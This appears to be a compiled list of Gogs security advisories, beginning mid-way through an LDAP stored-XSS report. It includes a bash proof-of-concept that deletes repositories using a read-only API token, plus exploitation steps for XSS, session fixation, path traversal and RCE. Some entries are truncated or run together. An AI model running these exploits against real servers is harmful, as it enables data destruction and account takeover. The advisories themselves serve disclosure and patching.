FullName, not Name) Unsafe sinks (| Safe without | Sanitize): templates/repo/issue/view_title.tmpl:40 templates/repo/issue/view_title.tmpl:42 templates/user/dashboard/issues.tmpl:86 cf. correctly guarded: templates/repo/issue/list.tmpl:116 (| Sanitize | Safe) Safe helper: internal/template/template.go:137-139 Safe(raw) -> template.HTML(raw) ``` ## Impact An attacker who can authenticate to Gogs through an LDAP bind-DN login source, and whose LDAP username attribute value they can influence, obtains a stored XSS primitive. After one successful login their HTML-bearing username is persisted in the Gogs database. From then on, any issue they open or comment on causes the payload to execute in the browser of every viewer of the issue detail page or the dashboard issue list, with no interaction beyond viewing the page. Script running in the Gogs origin can read page content and CSRF tokens and act as the victim; if an administrator views an affected page, the actions available to the script are those of an administrator. These action-level consequences follow from the proven script-execution primitive and are described as plausible rather than individually demonstrated. Pages are served without a Content Security Policy, so no CSP mitigates execution. ## Proof of Concept ```text Preconditions: - Gogs configured with an LDAP (bind DN) login source, i.e., auth.LDAP, not Direct bind. - The source's 'Attributes in Bind DN' username attribute (AttributeUsername) maps to an LDAP attribute whose value the attacker controls (e.g., cn or displayName on OpenLDAP, which impose no character restrictions on those attributes). ``` 1. In the LDAP directory, set the attacker entry's username attribute value to an HTML payload, for example `a]`. 2. Authenticate to Gogs once via the login form, selecting the LDAP source. Gogs creates a local account whose `Name` is the raw attribute value. 3. As that account, open an issue in any repository the attacker can post to. 4. Have any user view the issue detail page (`/{owner}/{repo}/issues/{index}`) or their dashboard issue list. ```text Rendered markup at the sink (templates/repo/issue/view_title.tmpl:40), with the username substituted into locale string issues.opened_by = 'opened %[1]s by %[3]s': opened by a] The tag is emitted as live HTML because | Safe disables auto-escaping, and onerror fires on load, executing script in the Gogs origin. ``` Live execution was not performed because it requires a configured LDAP directory backend; every edge of the chain is verified by source inspection at revision `dbbd717e923694c36f41b0360515b4374bbe6ee0`. ## Attack Chain 1. **Exposure:** The sign-in endpoint is reachable by any unauthenticated client; LDAP login sources are offered on the sign-in form when configured (`cmd/gogs/internal/web/webapi.go:125-126`). 2. **Control:** The sign-in request validates the username only as `required,max=254` (`cmd/gogs/internal/web/webapi_user.go:173-177`), unlike registration which uses `required,alphadashdot,max=35` (line 78). The attacker-controlled value is the LDAP attribute returned for their entry. 3. **Path:** `postUserSignIn` calls `Users().Authenticate(...)` (`cmd/gogs/internal/web/webapi_user.go:267-268`), which selects the LDAP provider by source type (`internal/database/login_sources.go:74-80`, bind DN -> `NewProvider(false, ...)`) and calls the provider (`internal/auth/ldap/provider.go:25-26`). 4. **Guard:** For bind DN mode the search path uses `sanitizedUserQuery`, which blocks only `\x00()*\\` and allows `<>` (`internal/auth/ldap/config.go:64-73`); the username attribute is then read raw (`internal/auth/ldap/config.go:257`). Account creation applies no character validation (`internal/database/users.go:286-287`, `1526-1558`), and `AfterFind` sanitizes only `FullName` (`internal/database/users.go:1276-1281`). 5. **Primitive:** The stored, unsanitized `Name` reaches the template sinks that pipe it through `Safe` without `Sanitize` (`templates/repo/issue/view_title.tmpl:40,42`; `templates/user/dashboard/issues.tmpl:86`), converting it to `template.HTML` (`internal/template/template.go:137-139`). 6. **Result:** Attacker-chosen HTML executes as script in the browser of any viewer of the affected issue or dashboard page, in the Gogs origin. ## Bypass Evidence The template layer is the protection that should neutralize HTML in a username, and the codebase already demonstrates the correct form at `templates/repo/issue/list.tmpl:116`, which pipes the author name through `| Sanitize | Safe` using the registered `bluemonday.UGCPolicy().Sanitize` (`internal/template/template.go:76`) that strips ``. The three vulnerable sinks omit the `| Sanitize` step, so `Safe` emits the raw value as `template.HTML`. The two upstream guards that could have blocked the input were tested and found ineffective for this path: `sanitizedUserQuery` does not include `<>` in its blocked set (contrast `sanitizedUserDN`, which does, making Direct-bind mode safe), and `isUsernameAllowed` enforces only reserved-name rules, not a character set. No prior advisory or fix covers this path; the previously published Gogs advisory CVE-2026-52798 (`.ipynb` preview XSS) addresses a different entry point, sink, and mechanism. One practical constraint was confirmed: because the stored `LowerName` becomes the lowercased HTML string, the attacker's subsequent logins with their plain login name no longer match the stored account, limiting them to a single session; this reduces repeat-login convenience but does not affect persistence of the stored payload or its execution for viewers. ## Affected Versions - **Ecosystem:** `go` - **Package:** `gogs.io/gogs` - **Confirmed affected range:** `<= 0.14.3` - **Latest release checked:** `0.14.3` ([Gogs release v0.14.3](https://github.com/gogs/gogs/releases/tag/v0.14.3)) - **Fix status:** not fixed The vulnerable templates and the permissive sanitizer are present at the 0.14.3 release cut and unchanged through the examined revision; no fix exists for this path in the available history. The lower (introduced) boundary could not be established from the available shallow history, as LDAP bind-DN support and the `| Safe` template pattern predate it; the confirmed upper bound is the latest published release. ## Suggested Fix Sanitize the author name at every template sink that currently renders it through `Safe`, matching the existing `{{ ... | Sanitize | Safe }}` pattern at `templates/repo/issue/list.tmpl:116` for `view_title.tmpl:40,42` and `dashboard/issues.tmpl:86`. For defense in depth, treat the username as the primary trust boundary: reject HTML characters when a username is created or imported (apply the same character restrictions used for registration to externally sourced accounts), and sanitize `Name` in `User.AfterFind` as `FullName` already is, so that any remaining unsanitized sink cannot emit stored HTML. Ensure the fix also covers the bind-DN LDAP query path, which currently permits `<>` where the DN sanitizer does not. --- Reported by zx.

CVE-2025-65852.title: Gogs has authorization bypass in repository deletion API
CVE-2025-65852.description: ### Summary The DELETE /api/v1/repos/:owner/:repo endpoint lacks necessary permission validation middleware. Consequently, any user with read access (including read-only collaborators) can delete the entire repository. This vulnerability stems from the API route configuration only utilizing the repoAssignment() middleware (which only verifies read access) without enforcing reqRepoOwner() or reqRepoAdmin(). ### Details 0. vulnerability location: - Vulnerable Endpoint：DELETE /api/v1/repos/:owner/:repo - Routing configuration file: internal/route/api/v1/api.go (approximately line 253) - Function handling file: internal/route/api/v1/repo/repo.go (approximately lines 320-338) 1. Root Cause Analysis Code Location 1: API Route Configuration (internal/route/api/v1/api.go ~ line 253) ```go // 当前的路由配置（存在漏洞） m.Delete("", repo.Delete) // 仅继承了外层的 repoAssignment() 中间件 ``` Code Location 2: Delete Function Implementation (internal/route/api/v1/repo/repo.go ~ lines 320-338) ```go // Delete 函数内部没有额外的权限检查 func Delete(c *context.APIContext) { // 直接执行删除操作，未验证用户是否为所有者 if err := models.DeleteRepository(c.User.ID, c.Repo.Repository.ID); err != nil { c.Error(500, "DeleteRepository", err) return } c.Status(204) } ``` 2. Missing Permission Check Comparison with route configurations for other sensitive operations: ```go // Webhooks 管理（正确实现） m.Group("/hooks", func() { m.Combo(""). Get(repo.ListHooks). Post(bind(api.CreateHookOption{}), repo.CreateHook) }, reqRepoAdmin()) // ✅ 使用了权限中间件 // 部署密钥管理（正确实现） m.Group("/keys", func() { m.Combo(""). Get(repo.ListDeployKeys). Post(bind(api.CreateKeyOption{}), repo.CreateDeployKey) }, reqRepoAdmin()) // ✅ 使用了权限中间件 // 删除仓库（漏洞） m.Delete("", repo.Delete) // ❌ 没有使用权限中间件 ``` 3. Data Flow Path - API Request Path: DELETE /api/v1/repos/:owner/:repo - Route Handling: The outer middleware repoAssignment() verifies that the user has read access (Passed). - Execution: The system directly executes the repo.Delete() function. - Permission Check: The reqRepoOwner() middleware check is missing. - Internal Validation: There is no permission validation inside the Delete() function either. - Result: Any user with read permission can delete the repository. ### PoC Prerequisites - A running Gogs instance. - The attacker's account is added as a collaborator to the target repository (Read access is sufficient). - The attacker possesses a valid API access token. - The target repository exists and is accessible. 📜 Test Steps (Bash) 1. Verify Gogs service is running curl -I http://localhost:10880 2. Create test accounts and repository - Owner account: owner / owner123456 - Read-only account: victim / victim123456 - Test repository: owner/delete-test 3. Add 'victim' as a read-only collaborator Perform this via the Web UI or API 4. Obtain API token for 'victim' curl -X POST http://localhost:10880/api/v1/users/victim/tokens \ -u victim:victim123456 \ -H "Content-Type: application/json" \ -d '{"name":"test-token"}' 5. Resource deleted Web UI：Target repository deletion successful 📜 PoC Script ```bash #!/bin/bash # Gogs 仓库删除授权绕过漏洞 PoC # ============ 配置信息 ============ GOGS_URL="http://localhost:10880" TARGET_REPO="owner/delete-test" VICTIM_TOKEN="your_victim_read_only_token_here" # ============ 执行攻击 ============ echo "========================================" echo "Gogs 仓库删除授权绕过漏洞 PoC" echo "========================================" echo "" echo "目标仓库: $TARGET_REPO" echo "攻击者权限: Read（只读）" echo "预期行为: 403 Forbidden（应该被拒绝）" echo "" # 步骤1：验证仓库存在 echo "[步骤1] 验证目标仓库存在..." REPO_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \ -H "Authorization: token $VICTIM_TOKEN" \ "$GOGS_URL/api/v1/repos/$TARGET_REPO") if [ "$REPO_CHECK" == "200" ]; then echo "✓ 仓库存在且可访问" else echo "✗ 仓库不存在或无权访问 (状态码: $REPO_CHECK)" exit 1 fi # 步骤2：尝试删除仓库（漏洞利用） echo "" echo "[步骤2] 使用只读权限尝试删除仓库..." DELETE_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \ -X DELETE \ -H "Authorization: token $VICTIM_TOKEN" \ "$GOGS_URL/api/v1/repos/$TARGET_REPO") DELETE_CODE=$(echo "$DELETE_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2) echo "实际状态码: $DELETE_CODE" echo "" # 步骤3：验证结果 if [ "$DELETE_CODE" == "204" ] || [ "$DELETE_CODE" == "200" ]; then echo "========================================" echo "🔴 漏洞确认：删除成功！" echo "========================================" echo "" echo "只读权限用户成功删除了仓库！" echo "" # 验证仓库是否真的被删除 sleep 2 echo "验证仓库是否真的被删除..." VERIFY_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \ -H "Authorization: token $VICTIM_TOKEN" \ "$GOGS_URL/api/v1/repos/$TARGET_REPO") if [ "$VERIFY_CHECK" == "404" ]; then echo "✗ 仓库已被完全删除（404 Not Found）" echo "" echo "危害确认：" echo " - 仓库及所有数据永久丢失" echo " - 代码历史记录不可恢复" echo " - 这是一个 HIGH 级别的严重漏洞" else echo "? 仓库状态未知 (状态码: $VERIFY_CHECK)" fi elif [ "$DELETE_CODE" == "403" ]; then echo "========================================" echo "✅ 无漏洞：操作被正确拒绝" echo "========================================" echo "" echo "只读权限用户无法删除仓库，权限检查正常" else echo "========================================" echo "⚠️ 未预期的响应" echo "========================================" echo "" echo "状态码: $DELETE_CODE" echo "这可能表示 API 端点不存在或其他错误" fi echo "" echo "========================================" echo "PoC 执行完成" echo "========================================" ``` ### Impact Vulnerability Type: Broken Access Control (CWE-284) Description: A critical authorization bypass vulnerability exists in the Gogs API. The access control mechanism fails to properly validate permissions for destructive operations. Consequences: An authenticated attacker with low-level privileges (e.g., a collaborator with Read-Only access) can exploit this vulnerability to issue unauthorized DELETE requests. This allows the attacker to permanently delete entire repositories, resulting in the immediate loss of all source code, git history, issues, and wiki documentation. Severity: This vulnerability poses a critical risk to data integrity and availability, potentially leading to irreversible data loss and significant operational disruption for affected organizations. The Core Risk: Privilege Escalation & Data Destruction The most critical aspect of this vulnerability is the violation of the Principle of Least Privilege. It allows a user with the lowest level of access (Read-Only) to execute the most destructive action possible (Delete).

In version 0.13.3 and prior, the endpoint "PUT /repos/:owner/:repo/contents/*" does not require write permissions and allows access with read permission only via repoAssignment(). After passing the permission check, PutContents() invokes UpdateRepoFile(), which results in commit creation and the execution of git push. As a result, a token with read-only permission can be used to modify repository contents. This issue has been patched in versions 0.13.4 and 0.14.0+dev.

CVE-2026-23633.title: Gogs is an open source self-hosted Git service. In version 0.13.3 ...
CVE-2026-23633.description: Gogs is an open source self-hosted Git service. In version 0.13.3 and prior, there is an arbitrary file read/write via path traversal in Git hook editing. This issue has been patched in versions 0.13.4 and 0.14.0+dev.

CVE-2026-24135.title: Gogs is an open source self-hosted Git service. In version 0.13.3 ...
CVE-2026-24135.description: Gogs is an open source self-hosted Git service. In version 0.13.3 and prior, a path traversal vulnerability exists in the updateWikiPage function of Gogs. The vulnerability allows an authenticated user with write access to a repository's wiki to delete arbitrary files on the server by manipulating the old_title parameter in the wiki editing form. This issue has been patched in versions 0.13.4 and 0.14.0+dev.

CVE-2026-25119.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-25119.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, when ENABLE_REVERSE_PROXY_AUTHENTICATION is enabled, Gogs accepts the configured authentication header (default: X-WEBAUTH-USER) directly from client requests without validating that the request originated from a trusted reverse proxy. Any remote attacker who can reach the Gogs service can forge this header to impersonate any user or trigger automatic account creation, completely bypassing authentication. This vulnerability is fixed in 0.14.3.

CVE-2026-25120.title: Gogs is an open source self-hosted Git service. In versions 0.13. ...
CVE-2026-25120.description: Gogs is an open source self-hosted Git service. In versions 0.13.4 and below, the DeleteComment API does not verify that the comment belongs to the repository specified in the URL. This allows a repository administrator to delete comments from any other repository by supplying arbitrary comment IDs, bypassing authorization controls. The DeleteComment function retrieves a comment by ID without verifying repository ownership and the Database function DeleteCommentByID performs no repository validation. This issue has been fixed in version 0.14.0.

CVE-2026-25229.title: Gogs is an open source self-hosted Git service. Versions 0.13.4 a ...
CVE-2026-25229.description: Gogs is an open source self-hosted Git service. Versions 0.13.4 and below have a broken access control vulnerability which allows authenticated users with write access to any repository to modify labels belonging to other repositories. The UpdateLabel function in the Web UI (internal/route/repo/issue.go) fails to verify that the label being modified belongs to the repository specified in the URL path, enabling cross-repository label tampering attacks. The vulnerability exists in the Web UI's label update endpoint POST /:username/:reponame/labels/edit. The handler function UpdateLabel uses an incorrect database query function that bypasses repository ownership validation. This issue has been fixed in version 0.14.1.

CVE-2026-25232.title: Gogs is an open source self-hosted Git service. Versions 0.13.4 a ...
CVE-2026-25232.description: Gogs is an open source self-hosted Git service. Versions 0.13.4 and below have an access control bypass vulnerability which allows any repository collaborator with Write permissions to delete protected branches (including the default branch) by sending a direct POST request, completely bypassing the branch protection mechanism. This vulnerability in the DeleteBranchPost function eenables privilege escalation from Write to Admin level, allowing low-privilege users to perform dangerous operations that should be restricted to administrators only. Although Git Hook layer correctly prevents protected branch deletion via SSH push, the web interface deletion operation does not trigger Git Hooks, resulting in complete bypass of protection mechanisms. In oder to exploit this vulnerability, attackers must have write permissions to the target repository, protected branches configured to the target repository and access to the Gogs web interface. This issue has been fixed in version 0.14.1.

CVE-2026-25242.title: Gogs is an open source self-hosted Git service. Versions 0.13.4 a ...
CVE-2026-25242.description: Gogs is an open source self-hosted Git service. Versions 0.13.4 and below expose unauthenticated file upload endpoints by default. When the global RequireSigninView setting is disabled (default), any remote user can upload arbitrary files to the server via /releases/attachments and /issues/attachments. This enables the instance to be abused as a public file host, potentially leading to disk exhaustion, content hosting, or delivery of malware. CSRF tokens do not mitigate this attack due to same-origin cookie issuance. This issue has been fixed in version 0.14.1.

CVE-2026-25921.description: Gogs is an open source self-hosted Git service. CVE-2026-26022.title: Gogs is an open source self-hosted Git service. Prior to version  ...
CVE-2026-26022.description: Gogs is an open source self-hosted Git service. CVE-2026-26195.title: Gogs is an open source self-hosted Git service. Prior to version  ...
CVE-2026-26195.description: Gogs is an open source self-hosted Git service. Prior to version 0.14.2, stored xss is still possible through unsafe template rendering that mixes user input with safe plus permissive sanitizer handling of data urls. This issue has been patched in version 0.14.2.

CVE-2026-26196.title: Gogs is an open source self-hosted Git service. Prior to version  ...
CVE-2026-26196.description: Gogs is an open source self-hosted Git service. Prior to version 0.14.2, gogs api still accepts tokens in url params like token and access_token, which can leak through logs, browser history, and referrers. This issue has been patched in version 0.14.2.

CVE-2026-26276.title: Gogs is an open source self-hosted Git service. Prior to version  ...
CVE-2026-26276.description: Gogs is an open source self-hosted Git service. CVE-2026-47267.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-47267.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the fix for CVE-2022-1285 prevents adding webooks or running webhooks with URLs with a hostname that resolves in localCIDRs. However, webhooks still follow redirects allowing to access hostname inside localCIDRs. This vulnerability is fixed in 0.14.3.

CVE-2026-52795.title: Gogs is an open source self-hosted Git service. In 0.14.3 and ear ...
CVE-2026-52795.description: Gogs is an open source self-hosted Git service. In 0.14.3 and earlier, any authenticated user can watch a private repository they have no access to, because the access check in the Watch API handler is inverted. The code checks if repoCtx.ViewerCanRead() (returns 404 when the user CAN read) instead of if !repoCtx.ViewerCanRead() (return 404 when the user CANNOT read). Once watching, the attacker's dashboard activity feed shows commit messages, branch names, issue titles, and PR details from the private repository. If email notifications are enabled, the attacker also receives emails containing issue and comment content.

CVE-2026-52796.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52796.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, specially crafted issue index pattern can cause a panic when rendering, resulting in denial of service. In internal/markup/markup.go, RenderIssueIndexPattern renders the issue index pattern to a link using com.Expand, which is not safe: when the configured pattern contains an opening brace { but no closing brace }, strings.Index(template, "}") returns -1 and the subsequent slice template[:-1] triggers a panic. Once such a pattern is set, any page in the affected repository that contains an issue index reference such as #1 becomes unavailable. This vulnerability is fixed in 0.14.3.

CVE-2026-52797.title: Gogs is an open source self-hosted Git service. Prior to 0.14.0,  ...
CVE-2026-52797.description: Gogs is an open source self-hosted Git service. Prior to 0.14.0, as an authorized user, an intruder can dictate the value which is passed to the git diff command which, together with bypassing the filtering of the passed value, allows the user to bypass the target directory and write the result of the comparison to any arbitrary path. This vulnerability is fixed in 0.14.0.

CVE-2026-52798.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52798.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, although .ipynb previews are sanitized on the server side via /-/api/sanitize_ipynb, the inserted content is re-rendered on the client side without sanitization using marked() on elements with the .nb-markdown-cell class. During this process, links containing schemes such as javascript: can be regenerated. As a result, when a victim views an attacker-crafted .ipynb file and clicks the link, arbitrary JavaScript is executed in the Gogs origin, leading to a click-based Stored XSS. This vulnerability is fixed in 0.14.3.

CVE-2026-52799.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52799.description:
Gogs is an open source self-hosted Git service. Prior to 0.14.3, GET /attachments/:uuid returns the raw attachment file without verifying whether the requester has view permission for the associated Issue/Comment/Release or the repository.
In a test environment with REQUIRE_SIGNIN_VIEW = false, we confirmed that an unauthenticated user can download attachments belonging to a private repository. This vulnerability is fixed in 0.14.3.

CVE-2026-52800.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52800.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, organization team member management can be performed via GET requests without CSRF protection. If a victim who is an organization owner is logged in and is tricked into visiting a crafted link, an attacker-controlled user can be added to the Owners team. As a result, the attacker gains organization owner–equivalent privileges. This vulnerability is fixed in 0.14.3.

CVE-2026-52801.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52801.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Gogs Mirror Settings functionality provide an alternative way from the well protected New Migration functionality for any authenticated users to import local repositories. This issue stems from a lack of validation of SaveAddress function. This vulnerability is fixed in 0.14.3.

CVE-2026-52802.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52802.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, an open redirect vulnerability exists in Gogs where attacker-controlled redirect_to parameters can bypass validation, allowing redirection to arbitrary external sites. All redirects in Gogs that are validated via the IsSameSite function are vulnerable. The function only inspects the first two characters of the URL string. This check fails to account for directory traversal sequences followed by backslashes. This vulnerability is fixed in 0.14.3.

CVE-2026-52803.title: Session fixation
CVE-2026-52803.description: ### Summary The Gogs application does NOT regenerate session IDs upon successful authentication. This allows an attacker to perform a session fixation attack where they can force a victim to use a known session ID, then hijack the session after the victim logs in. Vulnerable Code Snippet: ``` // File: internal/route/user/auth.go func SignInPost(c *context.Context, f form.SignIn) { // ... authentication logic ... // ADD THIS: Regenerate session ID on successful login c.Session.RegenerateID(c.Req.Context()) // ... set user session ... } ``` ### PoC - Attacker obtains the session ID by visiting login page → Session: i_like_gogs=c9af1981d493dc56 - Attacker forces the victim to use this session ID via: - Social engineering (send link with cookie) - XSS on subdomain - MITM attack - Physical access - Victim logs in using attacker's session ID → Session remains: c9af1981d493dc56 - Attacker uses the same session ID to access the victim's account → Complete account takeover achieved! ### Impact - Account Takeover: Complete compromise of user accounts - Data Breach: Access to private repositories and sensitive data - Privilege Escalation: If the admin account is compromised, full system access - Persistence: Attacker maintains access as long as the session is valid

CVE-2026-52804.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52804.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, a repository admin collaborator can escalate their privileges to owner-level access by exploiting an off-by-one error in the ChangeCollaborationAccessMode function. This vulnerability is fixed in 0.14.3.

CVE-2026-52805.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52805.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, a Server-Side Request Forgery (SSRF) vulnerability exists in the repository migration functionality. The application validates only the initially submitted URL hostname, but git clone --mirror follows HTTP redirects. An authenticated user can submit a public URL that redirects to a blocked internal endpoint (e.g., 127.0.0.1), importing the internal repository's contents into an attacker-controlled repository. This vulnerability is fixed in 0.14.3.

CVE-2026-52806.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52806.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Gogs allows authenticated users to achieve Remote Code Execution (RCE) on the server by creating a pull request with a specially crafted branch name that injects the --exec flag into the git rebase command during the "Rebase before merging" merge operation. This vulnerability is fixed in 0.14.3.

CVE-2026-52807.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52807.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, in new_form.tmpl, milestone names are rendered with Go's default auto-escaping ({{.Name}}), which converts < to < etc. This prevents direct HTML injection. However, when the browser renders the DOM, the text content of the element contains the decoded original payload. Semantic UI 2.4.2's dropdown component has preserveHTML: true as the default setting. When a user selects a dropdown item, the internal set.text() method calls jQuery's .html() with the item's text content. This re-parses the decoded text as HTML, creating the injected element and triggering the JavaScript event handler. An attacker can store an HTML/JavaScript payload in a milestone name, and when any user opens the New Issue page and interacts with the milestone dropdown, the payload executes in their browser via Semantic UI's preserveHTML behavior. This vulnerability is fixed in 0.14.3.

CVE-2026-52808.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52808.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, three API endpoints — PATCH /api/v1/repos/:owner/:repo/issue-tracker, PATCH /api/v1/repos/:owner/:repo/wiki, and POST /api/v1/repos/:owner/:repo/mirror-sync — are gated by reqRepoWriter() rather than reqRepoAdmin(). The equivalent operations in the web UI sit behind reqRepoAdmin, which requires AccessMode >= AccessModeAdmin. A write-level collaborator (who has AccessMode == AccessModeWrite < AccessModeAdmin) can therefore call these API endpoints directly to disable the native issue tracker or wiki, inject attacker-controlled external tracker/wiki URLs that redirect all repository visitors, or trigger mirror sync — none of which they are authorized to do. This vulnerability is fixed in 0.14.3.

CVE-2026-52809.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52809.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, password-reset tokens are generated using conf.Auth.ActivateCodeLives (the account-activation lifetime), not conf.Auth.ResetPasswordCodeLives. The token lifetime is baked into the token itself at generation time and is re-extracted from the token at verification time, making RESET_PASSWORD_CODE_LIVES irrelevant to actual enforcement. When an administrator configures a shorter reset window (e.g., 10 minutes) for compliance or security reasons, reset tokens remain exploitable for the full activation lifetime instead, while the reset email falsely advertises the shorter expiry. This vulnerability is fixed in 0.14.3.

CVE-2026-52810.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52810.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Git smart HTTP authorizes POST …/git-receive-pack using the client-supplied service query string (so ?service=git-upload-pack is evaluated as read access) while routing still runs git receive-pack, allowing push where only read should be allowed. This vulnerability is fixed in 0.14.3.

CVE-2026-52811.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52811.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, (*Repository).UploadRepoFiles checks for symlinks only on the leaf of the upload target (osx.IsSymlink(targetPath)). The siblings UpdateRepoFile, DeleteRepoFile, and GetDiffPreview use hasSymlinkInPath, which lstats every component — UploadRepoFiles is the lone outlier. An attacker with repo-write access plus a multipart upload whose filename contains a literal backslash (preserved by filepath.Base on Linux, then converted to / by pathx.Clean) redirects the write through a previously-committed directory symlink. iox.CopyFile opens the destination with os.Create (no O_NOFOLLOW), so the kernel follows the parent symlink and writes attacker bytes anywhere the gogs UID can write — ~git/.ssh/authorized_keys → SSH foothold, or <repo>.git/hooks/post-receive → next-push RCE. This vulnerability is fixed in 0.14.3.

CVE-2026-52812.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52812.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Git LFS storage is content-addressed by OID alone (<LFS-root>/<oid[0]>/<oid[1]>/<oid>) but per-repo authorization lives in the lfs_object table keyed (repo_id, oid). serveUpload skips re-uploading when the OID file already exists on disk and inserts a new (repo_id, oid) row pointing at it without verifying the request body hashes to the OID being claimed. Any user with write access to one repo can bind their repo to an OID owned by a private repo and download the original bytes via their own download endpoint. This vulnerability is fixed in 0.14.3.

CVE-2026-52813.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52813.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, organization names containing path traversal sequences (../) are accepted by Gogs, and repositories under them are written to paths following these path traversals. This allows storing/retrieving data for repositories at arbitrary locations on the filesystem. By creating nested structure of Git repositories, one can overwrite the other's hooks configuration to result in Remote Code Execution (RCE). This vulnerability is fixed in 0.14.3.

CVE-2026-52814.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52814.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Gogs built-in Go SSH server is vulnerable to an unauthenticated, asymmetric Denial of Service (DoS) attack. The application accepts inbound TCP connections and passes them to golang.org/x/crypto/ssh.NewServerConn inside a new goroutine without enforcing any read/write deadlines on the underlying net.Conn. An unauthenticated attacker can open multiple TCP connections to the SSH port and simply withhold the SSH protocol banner. This forces the server to spawn an unbounded number of goroutines that block indefinitely waiting for socket I/O. This leads to complete File Descriptor (FD) exhaustion, preventing legitimate users from accessing the Git SSH service, and ultimately destabilizing the entire Gogs process (e.g., causing internal log rotation failures). This vulnerability is fixed in 0.14.3.

CVE-2026-52815.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52815.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Gogs has an unauthenticated information disclosure vulnerability. The GET /api/v1/orgs/:orgname/teams endpoint at internal/route/api/v1/org_team.go:8 returns all teams for any organization without requiring authentication. The route group at internal/route/api/v1/api.go:380-385 lacks the reqToken() middleware, and the listTeams() handler performs no authentication check, exposing team IDs, names, descriptions, and permission levels to any unauthenticated caller. This vulnerability is fixed in 0.14.3.

CVE-2026-52816.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52816.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Jupyter Notebook (ipynb) sanitizer endpoint at POST /-/api/sanitize_ipynb allows arbitrary data: URIs without proper restrictions, potentially leading to Cross-Site Scripting (XSS). The endpoint uses bluemonday.UGCPolicy() with p.AllowURLSchemes("data") which permits all data URI schemes including data:text/html, enabling attackers to inject malicious HTML/JavaScript. Additionally, the endpoint has no authentication middleware, allowing any registered user to exploit this vulnerability. This vulnerability is fixed in 0.14.3.

CVE-2026-77918.title: Gogs through 0.14.4 contains an information disclosure vulnerabil ...
CVE-2026-77918.description: Gogs through 0.14.4 contains an information disclosure vulnerability that allows authenticated users to view private forks by querying fork listings without per-fork read checks. Attackers with read access to a private base repository can call GET /api/v1/repos/{owner}/{repo}/forks or the Forks web handler to obtain other users' private fork owners, names, descriptions and clone URLs.

GHSA-26gq-grmh-6xm6.title: Gogs vulnerable to Stored XSS via Mermaid diagrams
GHSA-26gq-grmh-6xm6.description: ### Summary Stored XSS via mermaid diagrams due to usage of vulnerable renderer library ### Details Gogs introduced support for rendering mermaid diagrams in version [0.13.0.](https://github.com/gogs/gogs/releases/tag/v0.13.0) Currently used version of the library [mermaid 11.9.0](https://github.com/gogs/gogs/tree/main/public/plugins/mermaid-11.9.0) is vulnerable to at least two XSS scenarios with publicly available payloads Resources: https://github.com/mermaid-js/mermaid/security/advisories/GHSA-7rqq-prvp-x9jh https://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw ### PoC 1. Create a markdown file eg. `README.md` containing following malicious mermaid diagram (payload based on [CVE-2025-54880](https://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw)) ``` architecture-beta group api(cloud)[API] service db "" [Database] in api ``` 2. The XSS should pop whenever either repository or file is viewed #### Demo https://github.com/user-attachments/assets/98320f62-6c1c-4254-aa61-95598c725235 ### Impact The attacker can potentially achieve account takeover In a worst case scenario if the victim were an instance admin this could lead to a compromise of the entire deployment ### Proposed remediation steps 1. Upgrade to a patched version of the third party library https://github.com/mermaid-js/mermaid/releases/tag/v10.9.5 2. Consider running mermaid using `sandbox` level which would mitigate impact of future potential cross-site scripting issues https://mermaid.js.org/config/usage.html#securitylevel

GHSA-53f6-cgcf-gp6v.title: Commit-message issue references post comments into private repositories the pusher cannot access
